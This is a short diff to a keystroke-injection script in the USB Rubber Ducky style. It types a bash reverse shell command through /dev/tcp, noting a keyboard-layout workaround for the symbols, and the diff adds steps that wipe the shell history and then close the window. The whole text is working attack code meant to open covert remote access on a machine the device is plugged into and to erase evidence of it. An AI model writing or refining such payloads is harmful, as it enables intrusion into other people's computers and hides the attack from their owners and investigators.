@@ -16,4 +16,8 @@ REM For some reason (maybe keyboard layout) `&` becomes `'` and `^` becomes `&` 
 STRING /bin/bash -i >^ /dev/tcp/0.0.0.0/1337 0<^1 ^ disown
 ENTER
 DELAY 500
+REM Clear history
+STRING cat /dev/null > ~/.bash_history; history -c; history -w
+ENTER
+DELAY 500
 GUI q
